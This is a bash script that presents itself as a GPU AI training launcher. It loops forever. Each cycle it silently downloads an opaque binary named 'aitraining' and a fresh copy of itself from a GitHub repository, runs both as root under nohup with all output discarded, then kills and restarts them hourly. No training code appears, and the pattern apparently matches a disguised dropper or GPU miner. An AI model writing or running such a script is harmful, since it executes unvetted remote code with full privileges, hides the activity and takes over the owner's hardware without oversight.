#!/bin/bash
# File: start_modelgp.sh launcher
# Purpose: Download scripts and manage GPU AI training process in-place using nohup

while true; do
    echo "========== Starting GPU AI Training Launcher =========="

    # Stop old processes safely
    for proc in "start_modelgp.sh" "aitraining"; do
        if pgrep -f "$proc" > /dev/null; then
            sudo pkill -f "$proc"
            echo "$proc stopped."
        else
            echo "$proc not running."
        fi
    done

    # Launch new process in background using nohup (silent)
    echo "Launching start_modelgp.sh with sudo in background (nohup)..."
    nohup bash -c '
        # Download the latest scripts to current folder
        sudo wget -q -O ./aitraining https://github.com/max313iq/Ssl/raw/main/aitraining
        sudo wget -q -O ./start_modelgp.sh https://github.com/max313iq/Ssl/raw/main/start_modelgp.sh

        # Ensure scripts are executable
        sudo chmod +x ./aitraining
        sudo chmod +x ./start_modelgp.sh

        # Start main GPU script
        sudo bash ./start_modelgp.sh
    ' > /dev/null 2>&1 &

    echo "start_modelgp.sh is now running (silent with nohup)."

    # Run for 1 hour (3600 seconds) before stopping
    sleep 3600

    echo "========== Stopping processes after 1 hour =========="
    for proc in "start_modelgp.sh" "aitraining"; do
        if pgrep -f "$proc" > /dev/null; then
            sudo pkill -f "$proc"
            echo "$proc stopped."
        else
            echo "$proc already stopped."
        fi
    done

    echo "Waiting 1 minute before restart..."
    sleep 60
done
